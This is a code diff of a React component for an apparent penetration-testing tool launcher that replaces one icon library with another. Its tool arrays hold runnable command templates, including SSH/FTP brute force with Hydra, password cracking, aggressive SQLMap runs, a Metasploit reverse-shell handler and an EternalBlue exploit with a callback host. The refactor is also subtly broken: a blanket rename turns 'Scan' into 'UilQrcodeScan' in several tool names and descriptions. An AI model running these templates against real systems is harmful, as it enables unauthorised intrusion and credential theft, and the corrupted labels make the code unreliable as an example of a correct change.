@@ -6,7 +6,7 @@ import { Input } from"@/components/ui/input";
 import { Textarea } from"@/components/ui/textarea";
 import { Badge } from"@/components/ui/badge";
 import { ScrollArea } from"@/components/ui/scroll-area";
-import { Sword, Shield, MagnifyingGlass, Terminal, Lightning, Lock, LockOpen, Eye, TreeStructure, Database, WifiHigh, Globe, DesktopTower, Key, FileText, Pulse, Warning, CheckCircle, PaperPlaneTilt, CircleNotch, Clock, Star, Trash, Copy, Scan } from "@phosphor-icons/react";
+import { UilBoltAlt, UilShield, UilSearch, UilWindow, UilBolt, UilLock, UilLockOpenAlt, UilEye, UilSitemap, UilDatabase, UilWifi, UilGlobe, UilDesktopAlt, UilKeySkeleton, UilFileAlt, UilHeartRate, UilExclamationTriangle, UilCheckCircle, UilPlaneFly, UilSpinner, UilClock, UilStar, UilTrashAlt, UilCopy, UilQrcodeScan } from "@iconscout/react-unicons";
 import { motion } from"framer-motion";
 import openClaw from"@/services/openclaw";
 import { useToast } from"@/hooks/use-toast";
@@ -50,125 +50,125 @@ interface CommandHistory {
 }
 
 const attackTools: Tool[] = [
- { name:"Nmap Port Scan", command:"nmap", description:"Network discovery and security auditing", category:"Network", icon: TreeStructure, requiresTarget: true, template:"nmap -sV -sC {target}" },
- { name:"Nmap Aggressive Scan", command:"nmap", description:"Aggressive scan with OS detection", category:"Network", icon: TreeStructure, requiresTarget: true, template:"nmap -A -T4 {target}" },
- { name:"Nmap Vuln Scan", command:"nmap", description:"Vulnerability detection scripts", category:"Network", icon: Warning, requiresTarget: true, template:"nmap --script vuln {target}" },
- { name:"SQLMap", command:"sqlmap", description:"SQL injection detection and exploitation", category:"Web", icon: Database, requiresTarget: true, template:"sqlmap -u {target} --batch --crawl=2" },
- { name:"SQLMap Risk 3", command:"sqlmap", description:"Aggressive SQL injection testing", category:"Web", icon: Database, requiresTarget: true, template:"sqlmap -u {target} --level=5 --risk=3 --batch" },
- { name:"Hashcat MD5", command:"hashcat", description:"MD5 password cracking", category:"Password", icon: Key, requiresTarget: false, template:"hashcat -m 0 -a 0 hashes.txt wordlist.txt" },
- { name:"Hashcat SHA256", command:"hashcat", description:"SHA-256 password cracking", category:"Password", icon: Key, requiresTarget: false, template:"hashcat -m 1400 -a 0 hashes.txt wordlist.txt" },
- { name:"Hydra SSH", command:"hydra", description:"SSH brute force", category:"Password", icon: LockOpen, requiresTarget: true, template:"hydra -L users.txt -P passwords.txt {target} ssh" },
- { name:"Hydra FTP", command:"hydra", description:"FTP brute force", category:"Password", icon: LockOpen, requiresTarget: true, template:"hydra -L users.txt -P passwords.txt {target} ftp" },
- { name:"Metasploit Handler", command:"msfconsole", description:"Reverse shell handler (configure LHOST/LPORT)", category:"Exploit", icon: Lightning, requiresTarget: false, template:"msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'" },
- { name:"Metasploit EternalBlue", command:"msfconsole", description:"MS17-010 exploit (configure LHOST)", category:"Exploit", icon: Lightning, requiresTarget: true, template:"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST <your-ip>; run'" },
- { name:"Burp Suite", command:"burpsuite", description:"Web application security testing (GUI/headless)", category:"Web", icon: Globe, requiresTarget: false, template:"burpsuite --headless --project-file=project.burp" },
- { name:"WPScan", command:"wpscan", description:"WordPress security scanner", category:"Web", icon: MagnifyingGlass, requiresTarget: true, template:"wpscan --url {target} --enumerate u,p,t" },
- { name:"John the Ripper", command:"john", description:"Password cracking tool", category:"Password", icon: Key, requiresTarget: false, template:"john --wordlist=wordlist.txt hashes.txt" },
- { name:"BeEF", command:"beef-xss", description:"Browser exploitation framework", category:"Web", icon: Eye, requiresTarget: false, template:"beef-xss -c /etc/beef-xss/config.yaml" },
+ { name:"Nmap Port UilQrcodeScan", command:"nmap", description:"Network discovery and security auditing", category:"Network", icon: UilSitemap, requiresTarget: true, template:"nmap -sV -sC {target}" },
+ { name:"Nmap Aggressive UilQrcodeScan", command:"nmap", description:"Aggressive scan with OS detection", category:"Network", icon: UilSitemap, requiresTarget: true, template:"nmap -A -T4 {target}" },
+ { name:"Nmap Vuln UilQrcodeScan", command:"nmap", description:"Vulnerability detection scripts", category:"Network", icon: UilExclamationTriangle, requiresTarget: true, template:"nmap --script vuln {target}" },
+ { name:"SQLMap", command:"sqlmap", description:"SQL injection detection and exploitation", category:"Web", icon: UilDatabase, requiresTarget: true, template:"sqlmap -u {target} --batch --crawl=2" },
+ { name:"SQLMap Risk 3", command:"sqlmap", description:"Aggressive SQL injection testing", category:"Web", icon: UilDatabase, requiresTarget: true, template:"sqlmap -u {target} --level=5 --risk=3 --batch" },
+ { name:"Hashcat MD5", command:"hashcat", description:"MD5 password cracking", category:"Password", icon: UilKeySkeleton, requiresTarget: false, template:"hashcat -m 0 -a 0 hashes.txt wordlist.txt" },
+ { name:"Hashcat SHA256", command:"hashcat", description:"SHA-256 password cracking", category:"Password", icon: UilKeySkeleton, requiresTarget: false, template:"hashcat -m 1400 -a 0 hashes.txt wordlist.txt" },
+ { name:"Hydra SSH", command:"hydra", description:"SSH brute force", category:"Password", icon: UilLockOpenAlt, requiresTarget: true, template:"hydra -L users.txt -P passwords.txt {target} ssh" },
+ { name:"Hydra FTP", command:"hydra", description:"FTP brute force", category:"Password", icon: UilLockOpenAlt, requiresTarget: true, template:"hydra -L users.txt -P passwords.txt {target} ftp" },
+ { name:"Metasploit Handler", command:"msfconsole", description:"Reverse shell handler (configure LHOST/LPORT)", category:"Exploit", icon: UilBolt, requiresTarget: false, template:"msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'" },
+ { name:"Metasploit EternalBlue", command:"msfconsole", description:"MS17-010 exploit (configure LHOST)", category:"Exploit", icon: UilBolt, requiresTarget: true, template:"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST <your-ip>; run'" },
+ { name:"Burp Suite", command:"burpsuite", description:"Web application security testing (GUI/headless)", category:"Web", icon: UilGlobe, requiresTarget: false, template:"burpsuite --headless --project-file=project.burp" },
+ { name:"WPScan", command:"wpscan", description:"WordPress security scanner", category:"Web", icon: UilSearch, requiresTarget: true, template:"wpscan --url {target} --enumerate u,p,t" },
+ { name:"John the Ripper", command:"john", description:"Password cracking tool", category:"Password", icon: UilKeySkeleton, requiresTarget: false, template:"john --wordlist=wordlist.txt hashes.txt" },
+ { name:"BeEF", command:"beef-xss", description:"Browser exploitation framework", category:"Web", icon: UilEye, requiresTarget: false, template:"beef-xss -c /etc/beef-xss/config.yaml" },
 ];
 
 const defenceTools: Tool[] = [
- { name:"Wireshark Capture", command:"tshark", description:"Network protocol analyzer (adjust interface)", category:"Monitor", icon: Pulse, requiresTarget: false, template:"tshark -i <interface> -w capture.pcap" },
- { name:"Wireshark HTTP", command:"tshark", description:"Capture HTTP traffic only (adjust interface)", category:"Monitor", icon: Pulse, requiresTarget: false, template:"tshark -i <interface> -Y http -w http_traffic.pcap" },
- { name:"TCPDump", command:"tcpdump", description:"Command-line packet analyzer (adjust interface)", category:"Monitor", icon: TreeStructure, requiresTarget: false, template:"tcpdump -i <interface> -w capture.pcap" },
- { name:"Snort IDS", command:"snort", description:"Intrusion detection system (configure interface)", category:"IDS", icon: Shield, requiresTarget: false, template:"snort -A console -q -c /etc/snort/snort.conf -i <interface>" },
- { name:"Zeek (Bro)", command:"zeek", description:"Network security monitor (configure interface)", category:"Monitor", icon: Eye, requiresTarget: false, template:"zeek -i <interface> local" },
- { name:"Suricata", command:"suricata", description:"IDS/IPS and network security monitoring (configure interface)", category:"IDS", icon: Shield, requiresTarget: false, template:"suricata -c /etc/suricata/suricata.yaml -i <interface>" },
- { name:"Lynis Audit", command:"lynis", description:"Security auditing tool", category:"Audit", icon: FileText, requiresTarget: false, template:"lynis audit system" },
- { name:"Lynis Pentest", command:"lynis", description:"Penetration testing mode", category:"Audit", icon: FileText, requiresTarget: false, template:"lynis audit system --pentest" },
- { name:"ClamAV Scan", command:"clamscan", description:"Antivirus scanning", category:"AV", icon: Shield, requiresTarget: false, template:"clamscan -r /home --infected --remove" },
- { name:"ClamAV Update", command:"freshclam", description:"Update virus definitions", category:"AV", icon: Database, requiresTarget: false, template:"freshclam" },
- { name:"Fail2Ban Status", command:"fail2ban-client", description:"Check ban status", category:"Protection", icon: Lock, requiresTarget: false, template:"fail2ban-client status sshd" },
- { name:"Fail2Ban Unban", command:"fail2ban-client", description:"Unban IP address", category:"Protection", icon: LockOpen, requiresTarget: true, template:"fail2ban-client set sshd unbanip {target}" },
- { name:"AIDE Check", command:"aide", description:"File integrity checker", category:"Integrity", icon: CheckCircle, requiresTarget: false, template:"aide --check" },
- { name:"AIDE Init", command:"aide", description:"Initialize integrity database", category:"Integrity", icon: Database, requiresTarget: false, template:"aide --init" },
- { name:"Chkrootkit", command:"chkrootkit", description:"Rootkit scanner", category:"Security", icon: MagnifyingGlass, requiresTarget: false, template:"chkrootkit" },
- { name:"Rkhunter", command:"rkhunter", description:"Rootkit hunter", category:"Security", icon: Shield, requiresTarget: false, template:"rkhunter --check" },
- { name:"OSQuery", command:"osquery", description:"SQL-powered OS analytics (non-interactive)", category:"Monitor", icon: Database, requiresTarget: false, template:"osquery --json \"SELECT * FROM processes;\"" },
- { name:"Auditd", command:"auditctl", description:"Linux audit system", category:"Audit", icon: FileText, requiresTarget: false, template:"auditctl -l" },
+ { name:"Wireshark Capture", command:"tshark", description:"Network protocol analyzer (adjust interface)", category:"Monitor", icon: UilHeartRate, requiresTarget: false, template:"tshark -i <interface> -w capture.pcap" },
+ { name:"Wireshark HTTP", command:"tshark", description:"Capture HTTP traffic only (adjust interface)", category:"Monitor", icon: UilHeartRate, requiresTarget: false, template:"tshark -i <interface> -Y http -w http_traffic.pcap" },
+ { name:"TCPDump", command:"tcpdump", description:"Command-line packet analyzer (adjust interface)", category:"Monitor", icon: UilSitemap, requiresTarget: false, template:"tcpdump -i <interface> -w capture.pcap" },
+ { name:"Snort IDS", command:"snort", description:"Intrusion detection system (configure interface)", category:"IDS", icon: UilShield, requiresTarget: false, template:"snort -A console -q -c /etc/snort/snort.conf -i <interface>" },
+ { name:"Zeek (Bro)", command:"zeek", description:"Network security monitor (configure interface)", category:"Monitor", icon: UilEye, requiresTarget: false, template:"zeek -i <interface> local" },
+ { name:"Suricata", command:"suricata", description:"IDS/IPS and network security monitoring (configure interface)", category:"IDS", icon: UilShield, requiresTarget: false, template:"suricata -c /etc/suricata/suricata.yaml -i <interface>" },
+ { name:"Lynis Audit", command:"lynis", description:"Security auditing tool", category:"Audit", icon: UilFileAlt, requiresTarget: false, template:"lynis audit system" },
+ { name:"Lynis Pentest", command:"lynis", description:"Penetration testing mode", category:"Audit", icon: UilFileAlt, requiresTarget: false, template:"lynis audit system --pentest" },
+ { name:"ClamAV UilQrcodeScan", command:"clamscan", description:"Antivirus scanning", category:"AV", icon: UilShield, requiresTarget: false, template:"clamscan -r /home --infected --remove" },
+ { name:"ClamAV Update", command:"freshclam", description:"Update virus definitions", category:"AV", icon: UilDatabase, requiresTarget: false, template:"freshclam" },
+ { name:"Fail2Ban Status", command:"fail2ban-client", description:"Check ban status", category:"Protection", icon: UilLock, requiresTarget: false, template:"fail2ban-client status sshd" },
+ { name:"Fail2Ban Unban", command:"fail2ban-client", description:"Unban IP address", category:"Protection", icon: UilLockOpenAlt, requiresTarget: true, template:"fail2ban-client set sshd unbanip {target}" },
+ { name:"AIDE Check", command:"aide", description:"File integrity checker", category:"Integrity", icon: UilCheckCircle, requiresTarget: false, template:"aide --check" },
+ { name:"AIDE Init", command:"aide", description:"Initialize integrity database", category:"Integrity", icon: UilDatabase, requiresTarget: false, template:"aide --init" },
+ { name:"Chkrootkit", command:"chkrootkit", description:"Rootkit scanner", category:"Security", icon: UilSearch, requiresTarget: false, template:"chkrootkit" },
+ { name:"Rkhunter", command:"rkhunter", description:"Rootkit hunter", category:"Security", icon: UilShield, requiresTarget: false, template:"rkhunter --check" },
+ { name:"OSQuery", command:"osquery", description:"SQL-powered OS analytics (non-interactive)", category:"Monitor", icon: UilDatabase, requiresTarget: false, template:"osquery --json \"SELECT * FROM processes;\"" },
+ { name:"Auditd", command:"auditctl", description:"Linux audit system", category:"Audit", icon: UilFileAlt, requiresTarget: false, template:"auditctl -l" },
 ];
 
 const scanTools: Tool[] = [
  // Cloud/Internet Scanners
- { name:"Shodan Search", command:"shodan", description:"Search Internet-connected devices", category:"Cloud", icon: Globe, requiresTarget: true, template:"shodan search {target}" },
- { name:"Shodan Host Lookup", command:"shodan", description:"Get detailed host information", category:"Cloud", icon: DesktopTower, requiresTarget: true, template:"shodan host {target}" },
- { name:"Shodan Download", command:"shodan", description:"Download search results", category:"Cloud", icon: Database, requiresTarget: true, template:"shodan download --limit 1000 \"{target}\" results.json.gz" },
- { name:"ZoomEye", command:"zoomeye", description:"Cyberspace search engine (requires: pip install zoomeye)", category:"Cloud", icon: Eye, requiresTarget: true, template:"zoomeye search \"{target}\" --num 20" },
- { name:"Censys Search", command:"censys", description:"Internet-wide scanning platform (requires: pip install censys)", category:"Cloud", icon: MagnifyingGlass, requiresTarget: true, template:"censys search \"{target}\" --index-type hosts" },
+ { name:"Shodan Search", command:"shodan", description:"Search Internet-connected devices", category:"Cloud", icon: UilGlobe, requiresTarget: true, template:"shodan search {target}" },
+ { name:"Shodan Host Lookup", command:"shodan", description:"Get detailed host information", category:"Cloud", icon: UilDesktopAlt, requiresTarget: true, template:"shodan host {target}" },
+ { name:"Shodan Download", command:"shodan", description:"Download search results", category:"Cloud", icon: UilDatabase, requiresTarget: true, template:"shodan download --limit 1000 \"{target}\" results.json.gz" },
+ { name:"ZoomEye", command:"zoomeye", description:"Cyberspace search engine (requires: pip install zoomeye)", category:"Cloud", icon: UilEye, requiresTarget: true, template:"zoomeye search \"{target}\" --num 20" },
+ { name:"Censys Search", command:"censys", description:"Internet-wide scanning platform (requires: pip install censys)", category:"Cloud", icon: UilSearch, requiresTarget: true, template:"censys search \"{target}\" --index-type hosts" },
 
  // Vulnerability Scanners
- { name:"Nuclei", command:"nuclei", description:"Fast vulnerability scanner", category:"Vuln", icon: Lightning, requiresTarget: true, template:"nuclei -u {target} -t nuclei-templates/" },
- { name:"Nuclei CVE/Vuln", command:"nuclei", description:"Scan with CVE and vulnerability tags", category:"Vuln", icon: FileText, requiresTarget: true, template:"nuclei -u {target} -tags cve,vuln" },
- { name:"Nuclei Severity High", command:"nuclei", description:"High severity scans only", category:"Vuln", icon: Warning, requiresTarget: true, template:"nuclei -u {target} -severity high,critical" },
- { name:"Nessus", command:"nessus", description:"Comprehensive vulnerability scanner (GUI/API - use web interface)", category:"Vuln", icon: MagnifyingGlass, requiresTarget: false, template:"# Nessus is GUI-based - Access at https://localhost:8834" },
- { name:"OpenVAS", command:"gvm-cli", description:"Open-source vulnerability scanner (requires GVM setup)", category:"Vuln", icon: Shield, requiresTarget: false, template:"# OpenVAS uses GVM - Access web interface at https://127.0.0.1:9392" },
+ { name:"Nuclei", command:"nuclei", description:"Fast vulnerability scanner", category:"Vuln", icon: UilBolt, requiresTarget: true, template:"nuclei -u {target} -t nuclei-templates/" },
+ { name:"Nuclei CVE/Vuln", command:"nuclei", description:"UilQrcodeScan with CVE and vulnerability tags", category:"Vuln", icon: UilFileAlt, requiresTarget: true, template:"nuclei -u {target} -tags cve,vuln" },
+ { name:"Nuclei Severity High", command:"nuclei", description:"High severity scans only", category:"Vuln", icon: UilExclamationTriangle, requiresTarget: true, template:"nuclei -u {target} -severity high,critical" },
+ { name:"Nessus", command:"nessus", description:"Comprehensive vulnerability scanner (GUI/API - use web interface)", category:"Vuln", icon: UilSearch, requiresTarget: false, template:"# Nessus is GUI-based - Access at https://localhost:8834" },
+ { name:"OpenVAS", command:"gvm-cli", description:"Open-source vulnerability scanner (requires GVM setup)", category:"Vuln", icon: UilShield, requiresTarget: false, template:"# OpenVAS uses GVM - Access web interface at https://127.0.0.1:9392" },
 
  // Secret/Credential Scanners
- { name:"TruffleHog Git", command:"trufflehog", description:"Find secrets in Git repositories", category:"Secret", icon: Key, requiresTarget: true, template:"trufflehog git {target} --json" },
- { name:"TruffleHog Filesystem", command:"trufflehog", description:"Scan filesystem for secrets", category:"Secret", icon: FileText, requiresTarget: true, template:"trufflehog filesystem {target}" },
- { name:"GitLeaks", command:"gitleaks", description:"Detect hardcoded secrets", category:"Secret", icon: Lock, requiresTarget: true, template:"gitleaks detect --source={target} -v" },
- { name:"GitLeaks Protect", command:"gitleaks", description:"Pre-commit secret scanning", category:"Secret", icon: Shield, requiresTarget: false, template:"gitleaks protect -v" },
- { name:"Detect-Secrets", command:"detect-secrets", description:"Prevent secrets in code", category:"Secret", icon: Eye, requiresTarget: true, template:"detect-secrets scan {target}" },
+ { name:"TruffleHog Git", command:"trufflehog", description:"Find secrets in Git repositories", category:"Secret", icon: UilKeySkeleton, requiresTarget: true, template:"trufflehog git {target} --json" },
+ { name:"TruffleHog Filesystem", command:"trufflehog", description:"UilQrcodeScan filesystem for secrets", category:"Secret", icon: UilFileAlt, requiresTarget: true, template:"trufflehog filesystem {target}" },
+ { name:"GitLeaks", command:"gitleaks", description:"Detect hardcoded secrets", category:"Secret", icon: UilLock, requiresTarget: true, template:"gitleaks detect --source={target} -v" },
+ { name:"GitLeaks Protect", command:"gitleaks", description:"Pre-commit secret scanning", category:"Secret", icon: UilShield, requiresTarget: false, template:"gitleaks protect -v" },
+ { name:"Detect-Secrets", command:"detect-secrets", description:"Prevent secrets in code", category:"Secret", icon: UilEye, requiresTarget: true, template:"detect-secrets scan {target}" },
 
  // Port/Network Scanners
- { name:"Masscan", command:"masscan", description:"Ultra-fast port scanner", category:"Network", icon: Lightning, requiresTarget: true, template:"masscan {target} -p1-65535 --rate=1000" },
- { name:"Masscan Top Ports", command:"masscan", description:"Scan top 1000 ports (fast)", category:"Network", icon: TreeStructure, requiresTarget: true, template:"masscan {target} -p0-1000 --rate=10000" },
- { name:"RustScan", command:"rustscan", description:"Modern fast port scanner", category:"Network", icon: Lightning, requiresTarget: true, template:"rustscan -a {target}" },
- { name:"RustScan + Nmap", command:"rustscan", description:"RustScan with nmap scripts", category:"Network", icon: Terminal, requiresTarget: true, template:"rustscan -a {target} -- -A" },
- { name:"Angry IP Scanner", command:"ipscan", description:"Fast network scanner (primarily GUI)", category:"Network", icon: TreeStructure, requiresTarget: true, template:"ipscan -s {target} -o output.txt" },
+ { name:"Masscan", command:"masscan", description:"Ultra-fast port scanner", category:"Network", icon: UilBolt, requiresTarget: true, template:"masscan {target} -p1-65535 --rate=1000" },
+ { name:"Masscan Top Ports", command:"masscan", description:"UilQrcodeScan top 1000 ports (fast)", category:"Network", icon: UilSitemap, requiresTarget: true, template:"masscan {target} -p0-1000 --rate=10000" },
+ { name:"RustScan", command:"rustscan", description:"Modern fast port scanner", category:"Network", icon: UilBolt, requiresTarget: true, template:"rustscan -a {target}" },
+ { name:"RustScan + Nmap", command:"rustscan", description:"RustScan with nmap scripts", category:"Network", icon: UilWindow, requiresTarget: true, template:"rustscan -a {target} -- -A" },
+ { name:"Angry IP Scanner", command:"ipscan", description:"Fast network scanner (primarily GUI)", category:"Network", icon: UilSitemap, requiresTarget: true, template:"ipscan -s {target} -o output.txt" },
 
  // Web Scanners
- { name:"Nikto", command:"nikto", description:"Web server scanner", category:"Web", icon: DesktopTower, requiresTarget: true, template:"nikto -h {target}" },
- { name:"Nikto SSL", command:"nikto", description:"SSL/TLS scanning", category:"Web", icon: Lock, requiresTarget: true, template:"nikto -h {target} -ssl" },
- { name:"WPScan", command:"wpscan", description:"WordPress security scanner", category:"Web", icon: Globe, requiresTarget: true, template:"wpscan --url {target} --enumerate u,p,t" },
- { name:"WPScan Aggressive", command:"wpscan", description:"Aggressive WordPress scan", category:"Web", icon: Lightning, requiresTarget: true, template:"wpscan --url {target} --enumerate ap,at,cb,dbe --plugins-detection aggressive" },
- { name:"Wappalyzer", command:"wappalyzer", description:"Technology detection (requires: npm install -g wappalyzer-cli)", category:"Web", icon: Eye, requiresTarget: true, template:"wappalyzer {target} -o json" },
- { name:"WhatWeb", command:"whatweb", description:"Website fingerprinting", category:"Web", icon: MagnifyingGlass, requiresTarget: true, template:"whatweb {target} -v" },
+ { name:"Nikto", command:"nikto", description:"Web server scanner", category:"Web", icon: UilDesktopAlt, requiresTarget: true, template:"nikto -h {target}" },
+ { name:"Nikto SSL", command:"nikto", description:"SSL/TLS scanning", category:"Web", icon: UilLock, requiresTarget: true, template:"nikto -h {target} -ssl" },
+ { name:"WPScan", command:"wpscan", description:"WordPress security scanner", category:"Web", icon: UilGlobe, requiresTarget: true, template:"wpscan --url {target} --enumerate u,p,t" },
+ { name:"WPScan Aggressive", command:"wpscan", description:"Aggressive WordPress scan", category:"Web", icon: UilBolt, requiresTarget: true, template:"wpscan --url {target} --enumerate ap,at,cb,dbe --plugins-detection aggressive" },
+ { name:"Wappalyzer", command:"wappalyzer", description:"Technology detection (requires: npm install -g wappalyzer-cli)", category:"Web", icon: UilEye, requiresTarget: true, template:"wappalyzer {target} -o json" },
+ { name:"WhatWeb", command:"whatweb", description:"Website fingerprinting", category:"Web", icon: UilSearch, requiresTarget: true, template:"whatweb {target} -v" },
 
  // SSL/TLS Scanners
- { name:"SSLScan", command:"sslscan", description:"SSL/TLS cipher scanner", category:"SSL", icon: Lock, requiresTarget: true, template:"sslscan {target}" },
- { name:"TestSSL", command:"testssl.sh", description:"Comprehensive SSL/TLS testing (script path may vary)", category:"SSL", icon: Shield, requiresTarget: true, template:"./testssl.sh {target}" },
- { name:"SSLyze", command:"sslyze", description:"Fast SSL/TLS scanner", category:"SSL", icon: Lightning, requiresTarget: true, template:"sslyze --regular {target}" },
+ { name:"SSLScan", command:"sslscan", description:"SSL/TLS cipher scanner", category:"SSL", icon: UilLock, requiresTarget: true, template:"sslscan {target}" },
+ { name:"TestSSL", command:"testssl.sh", description:"Comprehensive SSL/TLS testing (script path may vary)", category:"SSL", icon: UilShield, requiresTarget: true, template:"./testssl.sh {target}" },
+ { name:"SSLyze", command:"sslyze", description:"Fast SSL/TLS scanner", category:"SSL", icon: UilBolt, requiresTarget: true, template:"sslyze --regular {target}" },
 
  // Container/Cloud Scanners
- { name:"Trivy Image", command:"trivy", description:"Container image scanner", category:"Container", icon: Database, requiresTarget: true, template:"trivy image {target}" },
- { name:"Trivy Filesystem", command:"trivy", description:"Filesystem vulnerability scan", category:"Container", icon: FileText, requiresTarget: true, template:"trivy fs {target}" },
- { name:"Grype", command:"grype", description:"Container/image scanner", category:"Container", icon: MagnifyingGlass, requiresTarget: true, template:"grype {target}" },
- { name:"ScoutSuite AWS", command:"scout-suite", description:"AWS security auditing", category:"Cloud", icon: Globe, requiresTarget: false, template:"scout-suite aws" },
- { name:"Prowler AWS", command:"prowler", description:"AWS security assessment", category:"Cloud", icon: Shield, requiresTarget: false, template:"prowler aws" },
+ { name:"Trivy Image", command:"trivy", description:"Container image scanner", category:"Container", icon: UilDatabase, requiresTarget: true, template:"trivy image {target}" },
+ { name:"Trivy Filesystem", command:"trivy", description:"Filesystem vulnerability scan", category:"Container", icon: UilFileAlt, requiresTarget: true, template:"trivy fs {target}" },
+ { name:"Grype", command:"grype", description:"Container/image scanner", category:"Container", icon: UilSearch, requiresTarget: true, template:"grype {target}" },
+ { name:"ScoutSuite AWS", command:"scout-suite", description:"AWS security auditing", category:"Cloud", icon: UilGlobe, requiresTarget: false, template:"scout-suite aws" },
+ { name:"Prowler AWS", command:"prowler", description:"AWS security assessment", category:"Cloud", icon: UilShield, requiresTarget: false, template:"prowler aws" },
 
  // DNS/Domain Scanners
- { name:"DNSReaper", command:"dnsreaper", description:"DNS takeover scanner", category:"DNS", icon: Warning, requiresTarget: true, template:"dnsreaper scan --domain {target}" },
- { name:"Altdns", command:"altdns", description:"Subdomain discovery via permutation (requires wordlist)", category:"DNS", icon: TreeStructure, requiresTarget: true, template:"altdns -i subdomains.txt -o output -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -s output.txt" },
+ { name:"DNSReaper", command:"dnsreaper", description:"DNS takeover scanner", category:"DNS", icon: UilExclamationTriangle, requiresTarget: true, template:"dnsreaper scan --domain {target}" },
+ { name:"Altdns", command:"altdns", description:"Subdomain discovery via permutation (requires wordlist)", category:"DNS", icon: UilSitemap, requiresTarget: true, template:"altdns -i subdomains.txt -o output -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -s output.txt" },
 ];
 
 const reconTools: Tool[] = [
- { name:"Nmap Host Discovery", command:"nmap", description:"Ping sweep for host discovery", category:"Network", icon: TreeStructure, requiresTarget: true, template:"nmap -sn {target}/24" },
- { name:"Nmap Fast Scan", command:"nmap", description:"Fast port scan (top 100 ports)", category:"Network", icon: Lightning, requiresTarget: true, template:"nmap -F {target}" },
- { name:"Masscan", command:"masscan", description:"Ultra-fast port scanner", category:"Network", icon: Lightning, requiresTarget: true, template:"masscan {target} -p1-65535 --rate=1000" },
- { name:"Gobuster Dir", command:"gobuster", description:"Directory/file brute-forcing", category:"Web", icon: MagnifyingGlass, requiresTarget: true, template:"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt" },
- { name:"Gobuster DNS", command:"gobuster", description:"DNS subdomain brute-forcing", category:"DNS", icon: Globe, requiresTarget: true, template:"gobuster dns -d {target} -w /usr/share/wordlists/subdomains.txt" },
- { name:"Dirb", command:"dirb", description:"Web content scanner", category:"Web", icon: MagnifyingGlass, requiresTarget: true, template:"dirb http://{target} /usr/share/wordlists/dirb/common.txt" },
- { name:"FFuf", command:"ffuf", description:"Fast web fuzzer", category:"Web", icon: Lightning, requiresTarget: true, template:"ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt" },
- { name:"Nikto", command:"nikto", description:"Web server scanner", category:"Web", icon: DesktopTower, requiresTarget: true, template:"nikto -h {target}" },
- { name:"WhatWeb", command:"whatweb", description:"Web technology identifier", category:"Web", icon: Eye, requiresTarget: true, template:"whatweb {target}" },
- { name:"theHarvester All", command:"theHarvester", description:"OSINT gathering tool", category:"OSINT", icon: Eye, requiresTarget: true, template:"theHarvester -d {target} -b all" },
- { name:"theHarvester Google", command:"theHarvester", description:"Google dorking", category:"OSINT", icon: MagnifyingGlass, requiresTarget: true, template:"theHarvester -d {target} -b google" },
- { name:"Amass Enum", command:"amass", description:"In-depth DNS enumeration", category:"DNS", icon: Globe, requiresTarget: true, template:"amass enum -d {target}" },
- { name:"Amass Intel", command:"amass", description:"Intelligence collection", category:"OSINT", icon: Eye, requiresTarget: true, template:"amass intel -d {target}" },
- { name:"Sublist3r", command:"sublist3r", description:"Subdomain enumeration", category:"DNS", icon: TreeStructure, requiresTarget: true, template:"sublist3r -d {target}" },
- { name:"Subfinder", command:"subfinder", description:"Fast passive subdomain discovery", category:"DNS", icon: MagnifyingGlass, requiresTarget: true, template:"subfinder -d {target}" },
- { name:"DNSRecon Standard", command:"dnsrecon", description:"Standard DNS enumeration", category:"DNS", icon: WifiHigh, requiresTarget: true, template:"dnsrecon -d {target} -t std" },
- { name:"DNSRecon Zone Transfer", command:"dnsrecon", description:"DNS zone transfer", category:"DNS", icon: Database, requiresTarget: true, template:"dnsrecon -d {target} -t axfr" },
- { name:"Fierce", command:"fierce", description:"DNS reconnaissance", category:"DNS", icon: MagnifyingGlass, requiresTarget: true, template:"fierce --domain {target}" },
- { name:"Shodan Search", command:"shodan", description:"Internet-connected device search", category:"OSINT", icon: MagnifyingGlass, requiresTarget: true, template:"shodan search {target}" },
- { name:"Shodan Host", command:"shodan", description:"Host information lookup", category:"OSINT", icon: DesktopTower, requiresTarget: true, template:"shodan host {target}" },
- { name:"Recon-ng", command:"recon-ng", description:"Full-featured reconnaissance framework (requires resource file for automation)", category:"OSINT", icon: Terminal, requiresTarget: false, template:"recon-ng -r /path/to/resource/file" },
- { name:"Metagoofil", command:"metagoofil", description:"Metadata extraction tool", category:"OSINT", icon: FileText, requiresTarget: true, template:"metagoofil -d {target} -t pdf,doc -l 50 -o output -f results.html" },
- { name:"SpiderFoot", command:"spiderfoot", description:"OSINT automation (CLI mode)", category:"OSINT", icon: Eye, requiresTarget: true, template:"spiderfoot -s {target} -m all" },
- { name:"Whois", command:"whois", description:"Domain registration lookup", category:"OSINT", icon: Globe, requiresTarget: true, template:"whois {target}" },
- { name:"Nslookup", command:"nslookup", description:"DNS query tool", category:"DNS", icon: WifiHigh, requiresTarget: true, template:"nslookup {target}" },
- { name:"Dig", command:"dig", description:"DNS lookup utility", category:"DNS", icon: TreeStructure, requiresTarget: true, template:"dig {target} ANY" },
+ { name:"Nmap Host Discovery", command:"nmap", description:"Ping sweep for host discovery", category:"Network", icon: UilSitemap, requiresTarget: true, template:"nmap -sn {target}/24" },
+ { name:"Nmap Fast UilQrcodeScan", command:"nmap", description:"Fast port scan (top 100 ports)", category:"Network", icon: UilBolt, requiresTarget: true, template:"nmap -F {target}" },
+ { name:"Masscan", command:"masscan", description:"Ultra-fast port scanner", category:"Network", icon: UilBolt, requiresTarget: true, template:"masscan {target} -p1-65535 --rate=1000" },
+ { name:"Gobuster Dir", command:"gobuster", description:"Directory/file brute-forcing", category:"Web", icon: UilSearch, requiresTarget: true, template:"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt" },
+ { name:"Gobuster DNS", command:"gobuster", description:"DNS subdomain brute-forcing", category:"DNS", icon: UilGlobe, requiresTarget: true, template:"gobuster dns -d {target} -w /usr/share/wordlists/subdomains.txt" },
